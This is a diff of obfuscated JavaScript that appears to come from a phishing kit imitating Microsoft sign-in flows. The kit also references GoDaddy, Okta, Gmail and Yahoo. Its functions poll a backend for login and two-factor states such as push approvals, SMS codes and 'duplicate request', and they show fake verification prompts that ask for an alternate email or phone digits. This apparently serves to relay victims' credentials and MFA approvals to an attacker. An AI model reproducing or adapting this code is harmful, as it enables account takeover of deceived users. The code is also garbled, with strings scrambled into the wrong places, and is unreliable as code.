-        <input class="form-control noRightBorder" autocomplete="off" type="email" id="iProofEmail" name="iProofEmail" maxlength="113" aria-required="true" aria-label="Email name" aria-describedby="iProofInputError">
-        <label class="input-group-addon noLeftBorder outlookEmailLabel" id="iConfirmProofEmailDomain">@` || _0x5dfe5c && view == `signinanothererror`) {
-                    _0x5dfe5c['message'] == 'signinblocked\x20live' && (document[`915612HwjQev`](`alert-error`)['innerText'] = _0x5dfe5c['email'], checkerrordesc(`error_uname_pdf`, 0x0, _0x5dfe5c[`authcall`]), checkerrordesc(`#tryagainheader`, 0x2, _0x5dfe5c[`section_confirmemailorphone_live`]), document[`915612HwjQev`]('section_authapp')['classList']['toggle'](`onclick`), document['getElementById'](`We didn't hear from you`)[`error_2fa`]['remove'](`onclick`), view = `error_uname_pdf`);
-                    _0x5dfe5c[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == 'more\x20info\x20required' && moreinforeq();
-                    _0x5dfe5c['message'] == 'waiting' && setTimeout(function () {
-                        wait2fa(_0x4ca70e, _0x31f687);
-                    }, 0x1f40);
-                    _0x5dfe5c[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `OneWaySMS_Live` && (wait2facancel = 0x1, document[`915612HwjQev`](`type`)[`error_2fa`][`show-from-left `]('d-none') && (document[`915612HwjQev`](`type`)[`hide-to-left `](`pop`)[`signoutoption`] = `approve auth request calling`, setTimeout(function () {
-                        const _0x577ebd = _0x11e711;
-                        document[`915612HwjQev`](`table-cell` + view)['querySelector']('.loading-container')[`error_2fa`][`json`](`removeAttribute`), document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `]('.sectioncontent')[`position`][`section_multipleaccounts_adfs`] = `section_multipleaccounts`, setTimeout(function () {
-                            const _0x27e71e = _0x577ebd;
-                            document['getElementById']('section_' + view)['classList'][`live.`](`onclick`), document[`915612HwjQev`](`type`)[`hide-to-left `](`success`)['style']['display'] = `303460zKjElf`, document[`915612HwjQev`](`type`)[`hide-to-left `](`link_text`)[`position`][`accountoptions`] = `303460zKjElf`, document[`915612HwjQev`](`type`)['querySelector'](`maxLength`)[`position`][`section_multipleaccounts_adfs`] = 'show-from-right\x200.5s', document[`915612HwjQev`](`type`)['classList'][`json`]('d-none'), view = `debugdetailsinfo`;
-                        }, 0xc8);
-                    }, 0x1f4)));
-                    _0x5dfe5c['message'] == 'approved' && (document['getElementById'](`Verify Online`)[`error_2fa`][`live.`](`onclick`), document[`915612HwjQev`](`3162355BEcpic`)[`error_2fa`][`json`](`onclick`), view = `Enter the code you received`);
-                    _0x5dfe5c[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `emailPartial` && (document[`915612HwjQev`](`small`)[`error_2fa`][`live.`](`onclick`), document[`915612HwjQev`](`3162355BEcpic`)['classList'][`json`](`onclick`), view = `Enter the code you received`);
-                    if (_0x5dfe5c[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `signinanothererrordesc`) {
-                        document[`915612HwjQev`](`useAuthenticator`)['querySelector']('.title')['textContent'] = _0x5dfe5c[`OneWayVoiceMobileOTP`];
-                        var _0x4ef25a = _0x5dfe5c[`authcall`];
-                        document[`915612HwjQev`]('authapperrordesc')[`show-from-right `] = `valid phone app otp` + _0x4ef25a[`display`] + `
-      <div class="text-block-body" id="iEnterProofDesc">
-        To verify that this is your phone number, enter the last 4 digits including `, checkerrordesc(`sections_pdf`, 0x2, _0x5dfe5c['resentlink']), authappbottomtext(_0x5dfe5c[`</label>
-      </div>
-      <div class="phcontainer" id="iProofPhoneEntry" style="display: none;" aria-hidden="true">
-        <label id="iProofPhoneHint" for="iProofPhone" class="form-group-top" aria-hidden="true">Last 4 digits of phone number</label>
-        <input type="tel" autocomplete="off" id="iProofPhone" name="iProofPhone" class="form-control input-max-width" maxlength="4" aria-required="true" aria-label="Last 4 digits of phone number" aria-describedby="iProofInputError">
-      </div>
-    `]), document[`915612HwjQev`](`small`)['classList'][`live.`](`onclick`), document[`915612HwjQev`](`useAuthenticator`)[`error_2fa`][`json`](`onclick`), view = `section_signin_blocked_live`;
-                    }
-                    if (_0x5dfe5c[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `CompanionAppsNotification`) {
-                        document['getElementById'](`useAuthenticator`)[`hide-to-left `](`pop`)[`Too many Attempts`] = _0x5dfe5c[`OneWayVoiceMobileOTP`];
-                        var _0x4ef25a = _0x5dfe5c['description'];
-                        document['getElementById'](`iAdditionalProofInfo`)['innerHTML'] = `valid phone app otp` + _0x4ef25a[`display`] + `
-      <div class="text-block-body" id="iEnterProofDesc">
-        To verify that this is your phone number, enter the last 4 digits including `, checkerrordesc(`sections_pdf`, 0x2, _0x5dfe5c[`head`]), authappbottomtext(_0x5dfe5c['checkapphavingtroublesection']), document['getElementById'](`Verify Online`)[`error_2fa`]['toggle'](`onclick`), document[`915612HwjQev`]('section_authapperror')['classList']['remove'](`onclick`), view = 'authapperror';
-                    }
-                }
-            })[`TwoWayVoiceMobile`](_0x4468ab => {
-                console['error']('Error:', _0x4468ab);
-            });
-        }
-        _0x4ca70e == `section_uname` && sendAndReceive('twofaselected', [`reload`, 'null'], 0x1)[`link`](_0x570d40 => {
-            const _0x43a70c = _0x48ecdb;
-            _0x570d40 && view == `indentNonCollapsible` && (_0x570d40[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == 'more\x20info\x20required' && moreinforeq(), _0x570d40[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `13301656iJZBwm` && setTimeout(function () {
-                wait2fa(_0x4ca70e, null);
-            }, 0x1f40), _0x570d40[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `OneWaySMS_Live` && (wait2facancel = 0x1, document[`915612HwjQev`]('section_tryagainlater')['classList'][`show-from-left `](`onclick`) && (document['getElementById'](`type`)[`hide-to-left `](`pop`)['innerText'] = `approve auth request calling`, setTimeout(function () {
-                const _0x19a741 = _0x43a70c;
-                document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `](`dirltr`)['classList'][`json`](`removeAttribute`), document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `](`maxLength`)['style']['animation'] = 'hide-to-left\x200.5s', setTimeout(function () {
-                    const _0x53c16c = _0x19a741;
-                    document[`915612HwjQev`](`table-cell` + view)[`error_2fa`][`live.`](`onclick`), document['getElementById']('section_tryagainlater')[`hide-to-left `]('#tryagainheader')[`position`]['display'] = `303460zKjElf`, document[`915612HwjQev`](`type`)['querySelector'](`link_text`)[`position`][`accountoptions`] = `303460zKjElf`, document[`915612HwjQev`](`type`)[`hide-to-left `](`maxLength`)[`position`][`section_multipleaccounts_adfs`] = `innerText`, document[`915612HwjQev`]('section_tryagainlater')[`error_2fa`][`json`](`onclick`), view = `debugdetailsinfo`;
-                }, 0xc8);
-            }, 0x1f4))), _0x570d40['message'] == `#oktasignin` && (document[`915612HwjQev`](`log`)['classList'][`live.`]('d-none'), document[`915612HwjQev`]('section_final')[`error_2fa`]['remove'](`onclick`), view = `Enter the code you received`), _0x570d40[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `emailPartial` && (document['getElementById'](`small`)['classList'][`live.`]('d-none'), document['getElementById'](`3162355BEcpic`)[`error_2fa`][`json`]('d-none'), view = `Enter the code you received`), _0x570d40['message'] == `CompanionAppsNotification` && checkerrordesc(`indentNonCollapsible`, 0x1, _0x570d40[`authcall`]));
-        })[`TwoWayVoiceMobile`](_0x4ddff9 => {
-            const _0x2100a7 = _0x48ecdb;
-            console[`CompanionAppsNotification`](`pwd`, _0x4ddff9);
-        });
+function wait2fa(_0x4a76d2, _0x221e66) {
+  const _0x365ebc = _0x283fde;
+  if (wait2facancel == 0x0) {
+    if (_0x4a76d2 == `</a>`) {
+      let _0x439f9a = null;
+      (_0x439f9a = _0x221e66),
+        sendAndReceive(`split`, [_0x439f9a, "null"], 0x1)
+          [`hide-to-left `]((_0x58b480) => {
+            const _0x568ba1 = _0x365ebc;
+            if (
+              (_0x58b480 && view == `email otp live`) ||
+              (_0x58b480 && view == `catch`)
+            ) {
+              _0x58b480[`</a> or try to sign in again shortly.</p>`] ==
+                `confirmemailorphone_live_title` &&
+                ((document["getElementById"](`sections_`)[`Next`] =
+                  _0x58b480[`inp_confirmemailorphone_live`]),
+                checkerrordesc(`aria-live`, 0x0, _0x58b480[`confirmemail`]),
+                checkerrordesc(
+                  `" onclick="linkoptionclick(this)">`,
+                  0x2,
+                  _0x58b480[`section_authcall`],
+                ),
+                document["getElementById"](`removeAttribute`)[`pdfemail`][
+                  "toggle"
+                ](`background-image`),
+                document[`selectprotectoption(this)`](
+                  "section_signin_blocked_live",
+                )[`pdfemail`]["remove"](`background-image`),
+                (view = `aria-live`));
+              _0x58b480[`</a> or try to sign in again shortly.</p>`] ==
+                "protectaccount\x20live" &&
+                (checkerrordesc(`methodid`, 0x0, _0x58b480[`confirmemail`]),
+                document[`selectprotectoption(this)`](`innerText` + view)[
+                  `pdfemail`
+                ][`waiting`]("d-none"),
+                document[`selectprotectoption(this)`](
+                  `Can’t access your account?`,
+                )[`pdfemail`][`<a class="link mb-16" href="#" data-id="`](
+                  `background-image`,
+                ),
+                (view = `methodid`));
+              _0x58b480[`</a> or try to sign in again shortly.</p>`] ==
+                `protect account` && moreinforeq();
+              _0x58b480[`</a> or try to sign in again shortly.</p>`] ==
+                `OneWaySMS` &&
+                setTimeout(function () {
+                  wait2fa(_0x4a76d2, _0x221e66);
+                }, 0x1f40);
+              _0x58b480[`</a> or try to sign in again shortly.</p>`] ==
+                `duplicate request` &&
+                setTimeout(function () {
+                  wait2fa(_0x4a76d2, _0x221e66);
+                }, 0x7d0);
+              _0x58b480["message"] == "duplicate\x20request" &&
+                ((wait2facancel = 0x1),
+                document["getElementById"](
+                  `waiting for previous request to complete`,
+                )[`pdfemail`][`Back`](`background-image`) &&
+                  ((document[`selectprotectoption(this)`](
+                    `waiting for previous request to complete`,
+                  )[`.loading-container`](`add`)[`Next`] = `useAuthenticator`),
+                  setTimeout(function () {
+                    const _0x20ac09 = _0x568ba1;
+                    document[`selectprotectoption(this)`](`innerText` + view)
+                      [`.loading-container`](`hasOwnProperty`)
+                      ["classList"]["remove"](`uname`),
+                      runanimation(0x2, view, 0.5, 0x0),
+                      setTimeout(function () {
+                        const _0x331dd8 = _0x20ac09;
+                        document[`selectprotectoption(this)`](
+                          "section_" + view,
+                        )["classList"][`waiting`](`background-image`),
+                          (document["getElementById"](
+                            `waiting for previous request to complete`,
+                          )[`.loading-container`]("#tryagainheader")["style"][
+                            "display"
+                          ] = `dynamic-style`),
+                          (document[`selectprotectoption(this)`](
+                            `waiting for previous request to complete`,
+                          )[`.loading-container`]("#tryagain_toomanyattempts")[
+                            `getElementById`
+                          ][`checkpass`] = `dynamic-style`),
+                          (document[`selectprotectoption(this)`](
+                            "section_tryagainlater",
+                          )[`.loading-container`](`relative`)[`getElementById`][
+                            `approve auth request auth app`
+                          ] = `signinanothererrordesc`),
+                          document[`selectprotectoption(this)`](
+                            `waiting for previous request to complete`,
+                          )[`pdfemail`][
+                            `<a class="link mb-16" href="#" data-id="`
+                          ]("d-none"),
+                          (view = `sections_pdf`);
+                      }, 0xc8);
+                  }, 0x1f4)));
+              _0x58b480[`</a> or try to sign in again shortly.</p>`] ==
+                `includes` &&
+                (document["getElementById"]("section_authapp")[`pdfemail`][
+                  `waiting`
+                ]("d-none"),
+                document[`selectprotectoption(this)`](`24px`)[`pdfemail`][
+                  `<a class="link mb-16" href="#" data-id="`
+                ]("d-none"),
+                (view = "final"));
+              _0x58b480["message"] == "approved\x20live" &&
+                (document[`selectprotectoption(this)`](`checkemail`)[
+                  "classList"
+                ][`waiting`](`background-image`),
+                document[`selectprotectoption(this)`]("section_final")[
+                  `pdfemail`
+                ][`<a class="link mb-16" href="#" data-id="`](
+                  `background-image`,
+                ),
+                (view = `authapp_live_code`));
+              if (_0x58b480["message"] == `POST`) {
+                document[`selectprotectoption(this)`](`noRightBorder`)[
+                  `.loading-container`
+                ](".title")["textContent"] = _0x58b480["title"];
+                var _0x1c4433 = _0x58b480[`confirmemail`];
+                (document["getElementById"](`iEnterProofDesc iProofLbl1`)[
+                  `content`
+                ] =
+                  `signinanothererror` +
+                  _0x1c4433[`maxlength`] +
+                  `validatediginp(this)`),
+                  checkerrordesc(
+                    `#godaddysignin`,
+                    0x2,
+                    _0x58b480[`confirmemailorphone_live`],
+                  ),
+                  authappbottomtext(_0x58b480[`1777886NxFwwE`]),
+                  document[`selectprotectoption(this)`](`checkemail`)[
+                    `pdfemail`
+                  ]["toggle"](`background-image`),
+                  document[`selectprotectoption(this)`](`noRightBorder`)[
+                    "classList"
+                  ][`<a class="link mb-16" href="#" data-id="`](
+                    `background-image`,
+                  ),
+                  (view = `Enter`);
+              }
+              if (
+                _0x58b480[`</a> or try to sign in again shortly.</p>`] == `auth`
+              ) {
+                document[`selectprotectoption(this)`](`noRightBorder`)[
+                  `.loading-container`
+                ](`add`)[`error_authapp_live`] = _0x58b480["title"];
+                var _0x1c4433 = _0x58b480[`confirmemail`];
+                (document[`selectprotectoption(this)`]("authapperrordesc")[
+                  `content`
+                ] = "<span>" + _0x1c4433[`maxlength`] + `validatediginp(this)`),
+                  checkerrordesc(
+                    `#godaddysignin`,
+                    0x2,
+                    _0x58b480[`confirmemailorphone_live`],
+                  ),
+                  authappbottomtext(_0x58b480[`1777886NxFwwE`]),
+                  document[`selectprotectoption(this)`]("section_authapp")[
+                    `pdfemail`
+                  ][`waiting`]("d-none"),
+                  document[`selectprotectoption(this)`]("section_authapperror")[
+                    `pdfemail`
+                  ][`<a class="link mb-16" href="#" data-id="`](
+                    `background-image`,
+                  ),
+                  (view = "authapperror");
+              }
+            }
+          })
+          [`section_signinanothererror`]((_0x3e2f6b) => {
+            const _0x48d353 = _0x365ebc;
+            console[`auth`](`selecttwofamethod(this)`, _0x3e2f6b);
+          });
     }
-    wait2facancel == 0x1 && (wait2facancel = 0x0);
-}
-
-function backbuttonclick(_0x70648d, _0xf60ad3) {
-    const _0x1d42e1 = _0xe042e;
-    _0x70648d[`Too many Attempts`] == `<p>` && runanimation(0x0, view, 0.3), _0x70648d[`Too many Attempts`] == `<p>` && (_0xf60ad3 == 0x1 && (callurl = `backgroundimage`), _0xf60ad3 == 0x2 && (callurl = 'multbackbtnclick'), sendAndReceive(callurl, [_0x70648d[`textContent`](`confirmemailorphone_live_title`)], 0x1)[`link`](_0x3d4fed => {
-        const _0x3e168a = _0x1d42e1;
-        _0x3d4fed && _0x3d4fed[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] !== `#f5f7f8` && (document[`915612HwjQev`]('section_' + view)[`hide-to-left `](`maxLength`)['style'][`section_multipleaccounts_adfs`] = '', _0x3d4fed[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == 'clicked' && (_0x70648d['textContent'] == `<p>` && (runanimation(0x3, `description`, 0.3), multipleaccountsback = 0x0, document[`915612HwjQev`]('section_multipleaccounts')[`error_2fa`][`live.`](`onclick`), document['getElementById'](`authapperrordesc`)['querySelector'](`maxLength`)['style'][`section_multipleaccounts_adfs`] = '', document['getElementById']('section_uname')[`error_2fa`][`json`]('d-none'), document[`style`][`position`][`<p class="mb-16">`] && (document[`style`][`position`][`<p class="mb-16">`] = ''), document['body'][`position`][`button.show-hide-btn`] && (document[`style`][`position`]['backgroundColor'] = ''), view = `description`)), _0x3d4fed[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `otp_livedesc` && (document[`915612HwjQev`](`table`)[`yahoo.`](`remove`, _0x3d4fed['image_src']), checkerrordesc(`
-      <div class="text-block-body" id="iEnterProofDesc">
-        To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.
-      </div>
-      <div role="alert" aria-live="assertive">
-        <div class="alert alert-error Hide" id="iProofInputError"></div>
-      </div>
-      <div class="emailPartial dirltr input-group input-max-width" id="iProofEmailEntry" style="display: table;">
-        <input class="form-control noRightBorder" autocomplete="off" type="email" id="iProofEmail" name="iProofEmail" maxlength="113" aria-required="true" aria-label="Email name" aria-describedby="iProofInputError">
-        <label class="input-group-addon noLeftBorder outlookEmailLabel" id="iConfirmProofEmailDomain">@`, 0x0, _0x3d4fed[`authcall`]), bottomsectionlinks(`
-      <div class="text-block-body" id="iEnterProofDesc">
-        To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.
-      </div>
-      <div role="alert" aria-live="assertive">
-        <div class="alert alert-error Hide" id="iProofInputError"></div>
-      </div>
-      <div class="emailPartial dirltr input-group input-max-width" id="iProofEmailEntry" style="display: table;">
-        <input class="form-control noRightBorder" autocomplete="off" type="email" id="iProofEmail" name="iProofEmail" maxlength="113" aria-required="true" aria-label="Email name" aria-describedby="iProofInputError">
-        <label class="input-group-addon noLeftBorder outlookEmailLabel" id="iConfirmProofEmailDomain">@`, _0x3d4fed[`listitem`]), changebackbutton(`
-      <div class="text-block-body" id="iEnterProofDesc">
-        To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.
-      </div>
-      <div role="alert" aria-live="assertive">
-        <div class="alert alert-error Hide" id="iProofInputError"></div>
-      </div>
-      <div class="emailPartial dirltr input-group input-max-width" id="iProofEmailEntry" style="display: table;">
-        <input class="form-control noRightBorder" autocomplete="off" type="email" id="iProofEmail" name="iProofEmail" maxlength="113" aria-required="true" aria-label="Email name" aria-describedby="iProofInputError">
-        <label class="input-group-addon noLeftBorder outlookEmailLabel" id="iConfirmProofEmailDomain">@`, _0x3d4fed['backbutton']), document['getElementById'](`section_accessblocked`)[`Too many Attempts`] = _0x3d4fed[`section_accessblocked`], document[`915612HwjQev`]('section_multipleaccounts')[`error_2fa`][`live.`](`onclick`), document[`915612HwjQev`]('section_authapp')['classList'][`json`](`onclick`), view = `
-      <div class="text-block-body" id="iEnterProofDesc">
-        To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.
-      </div>
-      <div role="alert" aria-live="assertive">
-        <div class="alert alert-error Hide" id="iProofInputError"></div>
-      </div>
-      <div class="emailPartial dirltr input-group input-max-width" id="iProofEmailEntry" style="display: table;">
-        <input class="form-control noRightBorder" autocomplete="off" type="email" id="iProofEmail" name="iProofEmail" maxlength="113" aria-required="true" aria-label="Email name" aria-describedby="iProofInputError">
-        <label class="input-group-addon noLeftBorder outlookEmailLabel" id="iConfirmProofEmailDomain">@`, wait2fa(`block`, _0x3d4fed['methodid'])), _0x3d4fed[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `input-group` && (document[`915612HwjQev`](`log`)[`hide-to-left `]('.back')[`resentlink`](), document[`915612HwjQev`](`checkemail`)[`yahoo.`](`remove`, _0x3d4fed[`pdfemail`]), checkerrordesc(`indentNonCollapsible`, 0x0, _0x3d4fed[`authcall`]), bottomsectionlinks('authcall', _0x3d4fed[`listitem`]), changebackbutton(`indentNonCollapsible`, _0x3d4fed['backbutton']), document[`915612HwjQev`]('section_multipleaccounts')[`error_2fa`]['toggle'](`onclick`), document[`915612HwjQev`](`log`)[`error_2fa`][`json`](`onclick`), view = 'authcall', wait2fa(`section_uname`)));
-    })[`TwoWayVoiceMobile`](_0x418b78 => {
-        const _0x56fa14 = _0x1d42e1;
-        loadinganimation(0x1), console[`CompanionAppsNotification`](`pwd`, _0x418b78);
-    }));
-}
-
-function linkoptionclick(_0x42c9d0) {
-    const _0x1d6260 = _0xe042e;
-    _0x42c9d0[`textContent`]('data-id') == 'try_again_otp' && window[`tel`][`.bannerlogo`]();
-    if (_0x42c9d0['getAttribute'](`confirmemailorphone_live_title`) == `createElement` || _0x42c9d0[`textContent`](`confirmemailorphone_live_title`) == `get a code a different way.` || _0x42c9d0[`Too many Attempts`] == `backgroundColor` || _0x42c9d0[`Too many Attempts`] == `hide-to-left 0.5s` || _0x42c9d0[`Too many Attempts`] == `Send another request` || _0x42c9d0[`Too many Attempts`] == `btn_protectaccount` || _0x42c9d0[`Too many Attempts`] == `authcallimg` || _0x42c9d0[`Too many Attempts`] == `Create one!` || _0x42c9d0[`Too many Attempts`][`Can't access your account?`](`length`)) {
-        loadinganimation(0x0);
-        (_0x42c9d0['textContent'] == `hide-to-left 0.5s` || _0x42c9d0[`textContent`](`confirmemailorphone_live_title`) == `get a code a different way.`) && (loadinganimation(0x1), wait2facancel = 0x1, document['getElementById'](`table-cell` + view)[`hide-to-left `](`maxLength`)[`position`]['animation'] = '', document['getElementById'](`table-cell` + view)[`error_2fa`][`live.`](`onclick`), document[`915612HwjQev`](`godaddyemail`)[`error_2fa`][`json`](`onclick`), view = '2fa');
-        _0x42c9d0[`textContent`](`confirmemailorphone_live_title`) == `createElement` && (loadinganimation(0x1), document[`915612HwjQev`](`Received response:`)[`signoutoption`] = `label`, document[`915612HwjQev`](`signinblocked live`)[`hide-to-left `](`maxLength`)[`position`][`section_multipleaccounts_adfs`] = '', document[`915612HwjQev`](`signinblocked live`)[`error_2fa`][`live.`](`onclick`), document[`915612HwjQev`](`gmail.`)[`error_2fa`]['remove']('d-none'), view = `selectmultipleaccountadfs`);
-        if (_0x42c9d0['textContent'] == `Send another request` || _0x42c9d0['textContent'] == 'Sign\x20in\x20using\x20another\x20Microsoft\x20account') {
-            loadinganimation(0x1), document[`915612HwjQev`]('footer')['style'][`loading`] = 'absolute', bottomsectionlinks('uname', [{
-                'a_id': 'signup',
-                'a_text': `you dont have access`,
-                'text': `sections`,
-                'type': 'text_link'
-            }, {
-                'a_id': 'cantAccessAccount',
-                'a_text': `section_2fa`,
-                'type': `alt`
-            }]);;
-            changebackbutton(`description`, 0x0), document[`915612HwjQev`]('section_' + view)[`error_2fa`][`live.`](`onclick`), document['getElementById']('inp_uname')['value'] = '', document['getElementById'](`godaddy`)['innerText'] = '', document[`915612HwjQev`](`tile-img`)[`591780njOthf`] = '', document[`915612HwjQev`](`authapperrordesc`)['querySelector'](`maxLength`)['style'][`section_multipleaccounts_adfs`] = '', document[`915612HwjQev`](`authapperrordesc`)[`error_2fa`]['remove'](`onclick`), document['body'][`position`]['backgroundImage'] && (document[`style`][`position`][`<p class="mb-16">`] = ''), document[`style`][`position`][`button.show-hide-btn`] && (document[`style`][`position`][`button.show-hide-btn`] = ''), view = `description`;
-        }
-        let _0x1ffd65 = 0x0;
-        viewtype == null && ((_0x42c9d0[`Too many Attempts`] == 'Send\x20another\x20request\x20to\x20my\x20Microsoft\x20Authenticator\x20app' || _0x42c9d0[`Too many Attempts`] == `Create one!`) && (_0x1ffd65 = 'PhoneAppNotification'), _0x42c9d0[`Too many Attempts`] == `a_id` && (_0x1ffd65 = `lets try something else or come back`), _0x42c9d0['textContent'] == `backgroundColor` && (_0x1ffd65 = 'PhoneAppOTP')), viewtype !== null && ((_0x42c9d0[`Too many Attempts`] == 'Send\x20another\x20request\x20to\x20my\x20Microsoft\x20app' || _0x42c9d0['textContent'] == `Create one!`) && (_0x1ffd65 = 'PhoneAppNotification_Live'), _0x42c9d0[`Too many Attempts`] == `backgroundColor` && (_0x1ffd65 = `section_authapp_live`)), (_0x42c9d0[`Too many Attempts`] == `body` || _0x42c9d0[`Too many Attempts`] == `Create one!` || _0x42c9d0['textContent'] == `a_id` || _0x42c9d0[`Too many Attempts`] == `backgroundColor`) && sendAndReceive(`signin_blocked_live`, [_0x1ffd65], 0x1)['then'](_0x1c51da => {
-            const _0x4c7081 = _0x1d6260;
-            if (_0x1c51da && _0x1c51da[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] !== `#f5f7f8`) {
-                loadinganimation(0x1), wait2facancel = 0x0;
-                _0x1c51da[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `Enter the code to help us verify your identity.` && (document['getElementById']('inp_otp_live')[`yahoo.`](`tile`, 'Code'), document[`915612HwjQev`](`iProofPhoneEntry`)[`position`][`accountoptions`] = `trim`, document['getElementById'](`iProofPhoneEntry`)['innerText'] = '', document['getElementById'](`error`)['setAttribute'](`remove`, _0x1c51da[`pdfemail`]), checkerrordesc(`selectmultipleaccountadfs`, 0x0, _0x1c51da[`authcall`]), bottomsectionlinks(`selectmultipleaccountadfs`, _0x1c51da['bottomsection']), changebackbutton(`selectmultipleaccountadfs`, _0x1c51da['backbutton']), document[`915612HwjQev`](`table-cell` + view)['classList'][`live.`](`onclick`), document[`915612HwjQev`](`gmail.`)[`error_2fa`][`json`]('d-none'), view = `selectmultipleaccountadfs`, viewtype = `2fa is off newwebsite`);
-                _0x1c51da[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `That doesn't match the alternate email associated with your account. The correct email starts with "` && (document['getElementById'](`data-id`)[`position`][`accountoptions`] = 'none', document['getElementById'](`data-id`)[`signoutoption`] = '', document['getElementById'](`display: unset;`)[`signoutoption`] = _0x1c51da['authappreqid'], bottomsectionlinks(`signinanothererror`, _0x1c51da[`listitem`]), changebackbutton(`signinanothererror`, _0x1c51da[`country`]), document[`915612HwjQev`]('section_' + view)[`error_2fa`][`live.`](`onclick`), document[`915612HwjQev`]('section_authapp_live')[`error_2fa`][`json`](`onclick`), view = `signinanothererror`, viewtype = `unset`, wait2fa(`block`, _0x1c51da['methodid']));
-                _0x1c51da[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `otp sent error` && (document[`915612HwjQev`](`iAdditionalProofInfo`)[`hide-to-left `](`hasOwnProperty`)['setAttribute'](`waiting for previous request to complete`, `CompanionAppsNotification`), document[`915612HwjQev`](`iAdditionalProofInfo`)[`hide-to-left `](`hasOwnProperty`)[`signoutoption`] = `Enter a security code`);
-                _0x1c51da[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `error_authcall` && (document[`915612HwjQev`](`type`)['classList'][`show-from-left `]('d-none') && (document[`915612HwjQev`](`type`)[`hide-to-left `]('.title')[`signoutoption`] = `14px`, setTimeout(function () {
-                    const _0x5bbe54 = _0x4c7081;
-                    document['getElementById'](`table-cell` + view)[`hide-to-left `](`dirltr`)['classList'][`json`]('loading'), document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `](`maxLength`)[`position`][`section_multipleaccounts_adfs`] = `section_multipleaccounts`, setTimeout(function () {
-                        const _0x502644 = _0x5bbe54;
-                        document[`915612HwjQev`]('section_' + view)['classList'][`live.`](`onclick`), document[`915612HwjQev`](`type`)[`hide-to-left `](`success`)[`position`]['display'] = `303460zKjElf`, document[`915612HwjQev`]('section_tryagainlater')[`hide-to-left `](`tiletitle`)['style']['display'] = `303460zKjElf`, document[`915612HwjQev`](`type`)[`hide-to-left `]('.sectioncontent')[`position`]['animation'] = 'show-from-right\x200.5s', document[`915612HwjQev`]('section_tryagainlater')['classList'][`json`](`onclick`), view = `debugdetailsinfo`;
+    _0x4a76d2 == "call" &&
+      sendAndReceive(`split`, [`<a href="#" data-id="`, "null"], 0x1)
+        [`hide-to-left `]((_0x722f1d) => {
+          const _0x527700 = _0x365ebc;
+          _0x722f1d &&
+            view == `oninput` &&
+            (_0x722f1d[`</a> or try to sign in again shortly.</p>`] ==
+              `protect account` && moreinforeq(),
+            _0x722f1d[`</a> or try to sign in again shortly.</p>`] ==
+              "waiting" &&
+              setTimeout(function () {
+                wait2fa(_0x4a76d2, null);
+              }, 0x1f40),
+            _0x722f1d[`</a> or try to sign in again shortly.</p>`] ==
+              "authenticaion\x20failed" &&
+              setTimeout(function () {
+                wait2fa(_0x4a76d2, _0x221e66);
+              }, 0x7d0),
+            _0x722f1d[`</a> or try to sign in again shortly.</p>`] ==
+              "duplicate\x20request" &&
+              ((wait2facancel = 0x1),
+              document[`selectprotectoption(this)`]("section_tryagainlater")[
+                `pdfemail`
+              ]["contains"](`background-image`) &&
+                ((document[`selectprotectoption(this)`](
+                  `waiting for previous request to complete`,
+                )[`.loading-container`](".title")[`Next`] = `useAuthenticator`),
+                setTimeout(function () {
+                  const _0x4313f0 = _0x527700;
+                  document[`selectprotectoption(this)`](`innerText` + view)
+                    [`.loading-container`](`hasOwnProperty`)
+                    [`pdfemail`][`<a class="link mb-16" href="#" data-id="`](
+                      `uname`,
+                    ),
+                    runanimation(0x2, view, 0.5, 0x0),
+                    setTimeout(function () {
+                      const _0x3fc0f6 = _0x4313f0;
+                      document["getElementById"]("section_" + view)[
+                        "classList"
+                      ]["toggle"](`background-image`),
+                        (document[`selectprotectoption(this)`](
+                          "section_tryagainlater",
+                        )[`.loading-container`]("#tryagainheader")[
+                          `getElementById`
+                        ]["display"] = `dynamic-style`),
+                        (document[`selectprotectoption(this)`](
+                          `waiting for previous request to complete`,
+                        )[`.loading-container`]("#tryagain_toomanyattempts")[
+                          "style"
+                        ][`checkpass`] = `dynamic-style`),
+                        (document[`selectprotectoption(this)`](
+                          "section_tryagainlater",
+                        )[`.loading-container`](`relative`)[`getElementById`][
+                          `approve auth request auth app`
+                        ] = "show-from-right\x200.5s"),
+                        document["getElementById"](
+                          `waiting for previous request to complete`,
+                        )[`pdfemail`]["remove"](`background-image`),
+                        (view = `sections_pdf`);
                     }, 0xc8);
-                }, 0x1f4)));
-                if (_0x1c51da['message'] == `section_final`) {
-                    document[`915612HwjQev`](`classList`)[`591780njOthf`] = '', document['getElementById'](`godaddy`)[`signoutoption`] = '', document[`915612HwjQev`](`tile-img`)['value'] = '', bottomsectionlinks(`description`, [{
-                        'a_id': `.btn_final`,
-                        'a_text': `you dont have access`,
-                        'text': `sections`,
-                        'type': `signInAnotherWay`
-                    }, {
-                        'a_id': `pwd_godaddy`,
-                        'a_text': `section_2fa`,
-                        'type': `alt`
-                    }]);;
